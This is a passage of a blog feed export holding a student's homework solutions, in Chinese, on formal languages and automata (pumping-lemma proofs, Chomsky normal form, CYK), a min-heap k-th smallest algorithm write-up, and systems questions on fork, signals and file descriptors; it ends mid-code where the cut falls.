        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-7-2-1-b"><a href="#Ex-7-2-1-b" class="headerlink" title="Ex.7.2.1(b)"></a>Ex.7.2.1(b)</h3><p>​    对于任意的 $n \ge 1$, 存在 $z = a^nb^nc^n\in\left\{a^nb^nc^i\mid i\le n\right\}$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(a)$ 若 $vwx$ 不包含 $c$, 取 $k = 0$, </p><p>​    此时易知 $\vert uv^kwx^ky\vert = \vert uwy\vert &lt; 3n$, 且其中 $c$ 的数目为 $n$,</p><p>​    那么 $c$ 的数目至少多于 $a, b$ 中的一个, 即<br>​    <script type="math/tex">uv^kwx^ky = uwy\notin\left\{a^nb^nc^i\mid i\le n\right\}.</script><br>​    $(b)$ 若 $vwx$ 包含 $c$, 那么必有 $x$ 包含 $c$. 取 $k = 2$, </p><p>​    由于 $\vert vwx\vert &lt; n$, 易知 $vwx$ 不包含 $a$,</p><p>​    此时 $uv^kwx^ky = uv^2wx^2y$, 且其中 $a$ 的数目为 $n$, $c$ 的数目 $&gt; n$,</p><p>​    那么 $c$ 的数目多于 $a$, 即<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y\notin\left\{a^nb^nc^i\mid i\le n\right\}.</script></p><p>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.</p><h3 id="Ex-7-2-1-d"><a href="#Ex-7-2-1-d" class="headerlink" title="Ex.7.2.1(d)"></a>Ex.7.2.1(d)</h3><p>​    对于任意的 $n \ge 1$, 存在 $z = 0^n1^{n^2}\in\left\{0^i1^j\mid j = i^2\right\}$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(A)$ 若 $vwx$ 仅包含 $0$, 取 $k = 0$, </p><p>​    此时 $uv^kwx^ky = uwy$, 其中 $0$ 的数目 $&lt; n$, $1$ 的数目为 $n^2$, 即<br>​    <script type="math/tex">uv^kwx^ky = uwy\notin\left\{0^i1^j\mid j = i^2\right\}.</script><br>​    $(B)$ 若 $vwx$ 仅包含 $1$, 取 $k = 0$, </p><p>​    此时 $uv^kwx^ky = uwy$, 其中 $1$ 的数目 $&lt; n^2$, $0$ 的数目为 $n$, 即<br>​    <script type="math/tex">uv^kwx^ky = uwy\notin\left\{0^i1^j\mid j = i^2\right\}.</script><br>​    $(C)$ 若 $vwx$ 同时包含 $0$ 和 $1$:</p><p>​    $(c.1)$ 若 $v$ 同时包含 $0$ 和 $1$, 取 $k = 2$, </p><p>​    不妨设<br>​    <script type="math/tex">v = 0^p1^q, x = 1^r,</script><br>​    其中<br>​    <script type="math/tex">p\ge 1, q\ge 1, p + q + r < n.</script><br>​    此时<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y = 0^{n + p}1^{n^2 + q + r},</script><br>​    其中<br>​    <script type="math/tex">(n + p)^2 > n^2 + 2np > n^2 + n > n^2 + q + r,</script><br>​    故有<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y\notin\left\{0^i1^j\mid j = i^2\right\}.</script><br>​    $(c.2)$ 若 $v$ 仅包含 $0$, 取 $k = 2$, </p><p>​    不妨设<br>​    <script type="math/tex">v = 0^p, x = 0^q1^r,</script><br>​    其中<br>​    <script type="math/tex">p\ge 1, p + q + r < n.</script><br>​    此时<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y = 0^{n + p + q}1^{n^2 + r},</script><br>​    其中<br>​    <script type="math/tex">(n + p + q)^2 > n^2 + 2np > n^2 + n > n^2 + r,</script><br>​    故有<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y\notin\left\{0^i1^j\mid j = i^2\right\}.</script><br>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.    </p><h3 id="Ex-7-3-1-b"><a href="#Ex-7-3-1-b" class="headerlink" title="Ex.7.3.1(b)"></a>Ex.7.3.1(b)</h3><p>​    考虑上下文无关语言 $L$ 的一个 $CNF$ 文法 $G = (V, T, P, S)$. </p><p>​    我们构造 $G’ = (V’, T, P’, S)$.</p><p>​    其中 $\forall\thinspace A\in V$, 我们令 $A\in V’, \thinspace A’\in V’$.</p><p>​    $\circ$ 若 $A\rightarrow BC\in P$, 我们令 $A\rightarrow BC\in P’, \thinspace A’\rightarrow BC’\in P’$.</p><p>​    $\circ$ 若 $A\rightarrow b\in P$, 我们令 $A\rightarrow b\in P’$.</p><p>​    若 $b\ne a$, 再令 $A’\rightarrow b\in P’$; 若 $b = a$, 则令 $A’\rightarrow\varepsilon\in P’$.</p><p>​    如此得到了一个文法 $G’$, $L/a = L(G’)$ 为上下文无关语言.</p><p>​    也即 $CFL$ 对 $L/a$ 运算封闭.</p><h3 id="Ex-7-3-2"><a href="#Ex-7-3-2" class="headerlink" title="Ex.7.3.2"></a>Ex.7.3.2</h3><p>​    $(a)$</p><p>​    满足 $L_1$ 的一个可行的上下文无关文法 $G_1$ 是:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow AB \\A &\rightarrow aAbb \mid \varepsilon \\B &\rightarrow cB \mid \varepsilon\end{aligned}</script><p>​    满足 $L_2$ 的一个可行的上下文无关文法 $G_2$ 是:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow AB \\A &\rightarrow aA \mid \varepsilon \\B &\rightarrow bBcc \mid \varepsilon\end{aligned}</script><p>​    易知 $L_1 = L(G_1)$, $L_2 = L(G_2)$.</p><p>​    $(b)$ 记<br>​    <script type="math/tex">L = L_1\cap L_2 = \left\{a^nb^{2n}c^{4n}\mid n\ge 0\right\}.</script><br>​    $L$ 不是 $CFG$, 使用 $Pumping$ 引理证明之.</p><p>​    对于任意的 $n \ge 1$, 存在 $z = a^nb^{2n}c^{4n}\in L$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(a)$ 若 $vwx$ 不包含 $c$, 取 $k = 0$, </p><p>​    此时易知 $\vert uv^kwx^ky\vert = \vert uwy\vert &lt; 7n$, 且其中 $c$ 的数目为 $4n$,</p><p>​    那么 $c$ 的数目要么多于 $a$ 的 $4$ 倍, 要么多于 $b$ 的 $2$ 倍, 即<br>​    <script type="math/tex">uv^kwx^ky = uwy\notin L.</script><br>​    $(b)$ 若 $vwx$ 包含 $c$, 那么必有 $x$ 包含 $c$. 取 $k = 2$, </p><p>​    由于 $\vert vwx\vert &lt; n$, 易知 $vwx$ 不包含 $a$,</p><p>​    此时 $uv^kwx^ky = uv^2wx^2y$, 且其中 $a$ 的数目为 $n$, $c$ 的数目 $&gt; 4n$, 即<br>​    <script type="math/tex">uv^kwx^ky = uv^2wx^2y\notin L.</script><br>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.</p><h3 id="Ex-7-3-6"><a href="#Ex-7-3-6" class="headerlink" title="Ex.7.3.6"></a>Ex.7.3.6</h3><p>​    作 $L = L(G)$, $G = (V, T, P, S)$. 构造 $G^R = (V, T, P^R, S)$.</p><p>​    其中 $P^R$ 的产生式是 $P$ 中的产生式的反向, 即<br>​    <script type="math/tex">A\rightarrow \alpha^R\in P^R\Leftrightarrow A\rightarrow\alpha\in P.</script></p><p>​    下证:<br>​    <script type="math/tex">\forall\thinspace w\in T^*, S\mathop{\Longrightarrow}\limits_G^* w\Longleftrightarrow S\mathop{\Longrightarrow}\limits_{G_R}^* w^R.</script><br>​    假设 $S\mathop{\Longrightarrow}\limits_G^* w$, 归纳于该推导的长度 $n$.</p><p>​    $\circ$ $n = 1$ 时, $S\rightarrow w$ 为 $G$ 中的一个产生式, </p><p>​    因而 $S\rightarrow w^R$ 为 $G^R$ 的一个产生式, 所以 $S\mathop{\Longrightarrow}\limits_{G_R}^* w^R$.</p><p>​    $\circ$ $n &gt; 1$ 时, 设第一步推导使用了产生式 $S\rightarrow X_1X_2\cdots X_k$,</p><p>​    其中 $X_i\in V\cup T (1\le i\le k)$. 可以将 $w$ 打断为 $w = w_1w_2\cdots w_k$,</p><p>​    若 $X_i\in V$, 则存在 $w_i\in T^<em>$, 使得在少于 $n$ 步内 $X_i\mathop{\Longrightarrow}\limits_G^</em> w_i$,</p><p>​    由归纳假设, $X_i\mathop{\Longrightarrow}\limits^*_{G^R} w_i^R$.</p><p>​    若 $X_i\in T$, 则令 $w_i= X_i$, 亦有 $X_i\mathop{\Longrightarrow}\limits^*_{G^R} w_i^R$.</p><p>​    由构造方法, $G^R$ 中包含产生式 $S\rightarrow X_kX_{k - 1}\cdots X_1$. 故</p><script type="math/tex; mode=display">\begin{aligned}S &{\mathop{\Longrightarrow}\limits_{G^R}} X_kX_{k - 1}\cdots X_1 \\&{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^RX_{k - 1}\cdots X_1 \\&{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^Rw_{k - 1}^R\cdots X_1 \\&{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^Rw_{k - 1}^R\cdots w_1^R \\&= (w_1w_2\cdots w_k)^R \\&= w^R.\end{aligned}</script><p>​    同理可证, 若 $S\mathop{\Longrightarrow}\limits_{G_R}^<em> w^R$, 则有 $S\mathop{\Longrightarrow}\limits_G^</em> w$.</p><p>​    由此可知 $L^R = L(G^R)$, $L^R$ 是上下文无关语言.</p><p>​    也即 $CFL$ 在反转运算下是封闭的.</p><h3 id="Ex-7-4-3-c"><a href="#Ex-7-4-3-c" class="headerlink" title="Ex.7.4.3(c)"></a>Ex.7.4.3(c)</h3><p>​    由 $CYK$ 算法构造的针对 $aabab$ 的表如下:</p><p> <img src="/pic/44.png" alt=""></p><p>​    由于 $S\in X_{15}$, 所以 $aabab\in L(G)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业9</title>
      <link href="/2022/12/15/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-9/"/>
      <url>/2022/12/15/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-9/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-7-1-3"><a href="#Ex-7-1-3" class="headerlink" title="Ex 7.1.3"></a>Ex 7.1.3</h3><p>​    (a) 符号 $S$, $A$, $B$, $C$ 是可致空的.<br>​    消去 $\varepsilon$-产生式后得到新的产生式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow 0A0 \mid 1B1 \mid 00 \mid 11 \mid BB \mid B \\A &\rightarrow C \\B &\rightarrow S \mid A \\C &\rightarrow S                 \end{aligned}</script><p>​    (b) 单位偶对有 $(A,A)$, $(B,B)$, $(C,C)$, $(S,S)$, $(A,C)$, $(A,S)$, $(A,B)$,<br>​    $(B,A)$, $(B,C)$, $(B,S)$, $(C,A)$, $(C,B)$, $(C,S)$, $(S,A)$, $(S,B)$, $(S,C)$.<br>​    消去单位产生式后得到新的产生式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \\A &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \\B &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \\C &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11\end{aligned}</script><p>​    (c) $C$ 为无用符号.<br>​    (d) 消去无用符号 $C$ 得到新的产生式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \\A &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \\B &\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11\end{aligned}</script><p>​    引入非终结符 $D$, $E$, 增加产生式 $D \rightarrow 0$ 和 $E \rightarrow 1$, 得产生式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \\A &\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \\B &\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \\D &\rightarrow 0 \\E &\rightarrow 1\end{aligned}</script><p>​    引入非终结符 $F$, $G$, 增加产生式 $F \rightarrow DA$ 和 $G \rightarrow EB$, 得到 $Chomsky$ 范式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow FD \mid GE \mid BB \mid DD \mid EE \\A &\rightarrow FD \mid GE \mid BB \mid DD \mid EE \\B &\rightarrow FD \mid GE \mid BB \mid DD \mid EE \\D &\rightarrow 0 \\E &\rightarrow 1 \\F &\rightarrow DA \\G &\rightarrow EB\end{aligned}</script><h3 id="Ex-7-1-9-b"><a href="#Ex-7-1-9-b" class="headerlink" title="Ex 7.1.9 (b)"></a>Ex 7.1.9 (b)</h3><p>​    首先证明所得符号是可达符号, 对推导使用结构归纳:</p><p>​    $\circ$ 注意到 $S\in V\cup T$, 且 $S\Rightarrow^{*}S$，所以 $S$ 为可达符号;</p><p>​    $\circ$ 设 $A$ 为可达符号, 且有产生式 $A\rightarrow\alpha$, $X$ 是 $\alpha$ 中的符号.</p><p>​    $\circ$ 则 $X\in V\cup T$. 即存在 $\beta, \gamma\in(V\cup T)^{*}$, 使得 $\alpha = \beta X\gamma$, </p><p>​    即 $A\rightarrow\beta X\gamma$ 是一个产生式. 因 $A$ 是可达符号, 由归纳假设, </p><p>​    存在 $\beta’, \gamma’\in(V\cup T)^{<em>}$, 使得 $S\Rightarrow^{</em>} \beta’ A\gamma’$, 进而 $S\Rightarrow^{*} \beta’\beta X\gamma\gamma’$, 所以 $X$ 是可达符号.</p><p>​    再证所有的可达符号都可由上述步骤得到:</p><p>​    $\circ$ 设 $X$ 是可达符号, 即存在 $\beta, \gamma\in(V\cup T)^{<em>}$, 使得 $S\Rightarrow^{</em>} \beta X\gamma$.</p><p>​    归纳于该推导的步数 $n$:</p><p>​    $\circ$ 若 $n = 0$, 一定有 $\beta X\gamma = S$, 只有 $X = S$ 可由上述步骤产生;</p><p>​    $\circ$ 若 $n &gt; 0$, 假设最后一步推导是 $\beta’ A\gamma’\Rightarrow^{*}\beta X\gamma$, </p><p>​    并使用了产生式 $A\rightarrow\beta^{‘’}X\gamma^{‘’}$. 因为 $S\Rightarrow^{*}\beta’ A\gamma’$ 的步数小于 $n$,<br>​    根据归纳假设，符号 $A$ 可由上述步骤产生. 结合产生式 $A\rightarrow\beta^{‘’}X\gamma^{‘’}$, 知 $X$ 也可由上述步骤产生.</p><p> 证毕。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kth</title>
      <link href="/2022/12/13/kth/"/>
      <url>/2022/12/13/kth/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-3-Kth"><a href="#4-3-Kth" class="headerlink" title="4-3 Kth"></a>4-3 Kth</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>因为不能直接访问数组 <code>a</code>, <code>b</code>, <code>c</code> 中的元素, 我们定义数组 <code>u</code>, <code>v</code>, <code>w</code>, 将其初始化为 $\{1, 2, …, n\}$, 用于记录数组 <code>a</code>, <code>b</code>, <code>c</code> 中元素的 <code>index</code>.</p><p>将三元组视为三维空间中的点集, 我们需要返回点集之中坐标和第 <code>k</code> 小的三元组. 在 <code>compare</code> 接口中固定两维度 <code>index</code> 为 <code>1</code>, 我们可以比较单一维度的元素大小. 借此对三个数组分别进行快排, 排序结果反应在数组 <code>u</code>, <code>v</code>, <code>w</code> 中.</p><p>一般地, 若排序前数组 <code>u</code> 为 $\{1, 2, …, n\}$, 排序后为 $\{u[1], u[2], …, u[n]\}$, 即意味着数组 <code>a</code> 元素按大小升序排列为 $\{a[u[1]], a[u[2]], …, a[u[n]]\}$.</p><p>此时点集中坐标和最小的三元组即为 $a[u[1]], b[v[1]], c[w[1]]$. 我们维护一个最小堆 <code>MinHeap</code>, 将 $(1, 1, 1)$ 插入. 随后依次删除堆顶最小元组, 并插入坐标和恰好不小于删去堆顶坐标和的三元组.</p><p>第 <code>k</code> 次 <code>Delete</code> 得到的三元组 $(x, y, z)$ 对应的即是坐标和第 <code>k</code> 小的三元组 $a[u[x]], b[v[y]], c[w[z]]$.</p><p>对这个三维点集, 坐标和恰不小于 $(x, y, z)$ 的三元组必是 $(x, y, z + 1)$, $(x, y + 1, z)$, $(x + 1, y, z)$ 之一, 将其插入 <code>MinHeap</code> 即可. 考虑到同一个点可能会被压入多次, 调用 <code>k</code> 次 <code>Delete()</code> 后得到不是坐标和第 <code>k</code> 小的三元组, 特约定:</p><p>对于堆顶三元组 $(x, y, z)$, 我们插入 $(x, y, z + 1)$; 若 $z = 1$, 再插入 $(x, y + 1, z)$; 若 $y = z = 1$, 再插入 $(x + 1, y, z)$.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>在每次插入 $(x, y, z)$ 应该检查坐标是否合理, 否则会因非法插入, 使得 <code>compare</code> 函数报错.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对数组 <code>a</code>, <code>b</code>, <code>c</code> 进行快速排序, 时间复杂度为 $O(nlogn)$;</p><p>在维护 <code>MinHeap</code> 的过程中, 进行 <code>k</code> 次 <code>Delete</code>, 至多进行 <code>3k</code> 次 <code>Insert</code>, 时间复杂度为 $O(klogk)$.</p><p>综上, 算法总体时间复杂度为 $O(nlogn + klogk)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>数组 <code>u</code>, <code>v</code>, <code>w</code> 动态分配的空间为 $O(n)$, 堆 <code>MinHeap</code> 消耗的空间为 $O(k)$, 因此算法总体空间复杂度为 $O(n + k)$.</p><p>本题中直接在堆内开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 13</span><span class="token keyword">class</span> <span class="token class-name">MinHeap</span> <span class="token punctuation">{</span> <span class="token comment">// 实现一个三元之和最小堆.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> elem<span class="token punctuation">[</span><span class="token number">4000100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $3\times 5\times 10^5 \times 4B + 1.2\times 10^7 \times 4B = 52MB &lt; 256MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业5</title>
      <link href="/2022/12/10/ji-suan-ji-xi-tong-gai-lun-zuo-ye-5/"/>
      <url>/2022/12/10/ji-suan-ji-xi-tong-gai-lun-zuo-ye-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Hw-5"><a href="#Hw-5" class="headerlink" title="Hw 5"></a>Hw 5</h1><ol><li><p>对于如下代码: 请回答以下问题  </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio&gt;</span></span><span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        counter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 注意: 这里没有 counter++;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1) 程序会输出多少行? (空行不计算在内)</p><p><strong>答:</strong> 会输出 10 行.</p><p>2) 程序第一行和最后一行分别会输出什么?</p><p><strong>答:</strong> 第一行输出 <code>counter = 1</code>; 最后一行输出 <code>counter = 2</code>.</p><p>3) 根据系统对进程的调度情况, 程序一共有多少种可能的输出结果? (如果同一时间有若干进程在同时运行, 他们运行的先后顺序的不同可能导致输出结果不同) </p><p><strong>答:</strong> 程序一共有 5 种可能的输出结果.</p><p>分别对应第一次 <code>fork</code> 的子线程在父线程 <code>4</code> 次 <code>counter = 2</code> 的输出之间.</p></li><li><p>对于如下代码:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">int</span> pid<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sig <span class="token operator">==</span> SIGINT <span class="token operator">&amp;&amp;</span> pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Killing Child process\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">kill</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Child process receiving Kill\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGKILL<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> status<span class="token punctuation">;</span>        <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"child's exit status=%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Waiting...!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行过程中, 如果用户按下 <code>Ctrl+C</code>, 请问程序在一串 <code>Waiting…!</code> 之后会输出什么内容, 为什么? </p><p><strong>答:</strong> 会输出:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Child process receiving KillKilling Child processchild's <span class="token builtin class-name">exit</span> <span class="token assign-left variable">status</span><span class="token operator">=</span><span class="token number">255</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>fork</code> 后在父进程内调用 <code>waitpid</code>, 父进程自身被挂起.</p><p>按下 <code>Ctrl+C</code> 后, 系统内核发送 <code>SIGINT</code> 信号至父进程与子进程, 子进程接收 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Child process receiving Kill</code>, 子进程退出. </p><p>随后父进程恢复, 接受 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Killing Child process</code>, 最后通过 <code>WEXITSTATUS</code> 获取子进程退出状态, 输出 <code>child's exit status=255</code>.</p></li><li><p>对于如下代码, 程序将输出什么内容, 为什么? (<code>foo.txt</code> 和 <code>bar.txt</code> 文件存在)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span> fd2<span class="token punctuation">;</span>    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fd2=%d\n"</span><span class="token punctuation">,</span> fd2<span class="token punctuation">)</span><span class="token 